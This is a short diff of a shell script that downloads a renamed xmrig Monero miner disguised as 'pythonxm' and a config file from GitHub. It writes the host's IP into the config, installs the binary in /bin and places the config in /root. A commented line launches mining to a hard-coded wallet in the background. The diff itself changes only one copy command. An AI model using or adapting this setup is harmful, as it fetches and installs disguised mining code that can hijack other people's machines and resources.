@@ -6,7 +6,7 @@ curl ipinfo.io
 wget https://github.com/one10001/xmrig/releases/download/v0.0.3/pythonxm
 wget https://github.com/one10001/10001code/raw/main/config2.json
 sed "s+ip0001+$IPNAME+g" config2.json
-cp config2.json /root/config.json
+mv config2.json /root/config.json
 chmod +x pythonxm
 cp pythonxm /bin/pythonxm
 #pythonxm  -o ehttp.info:443 --coin=XMR -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p  -p x -k -t 8 2> logxm.out 1> logxm.out  &
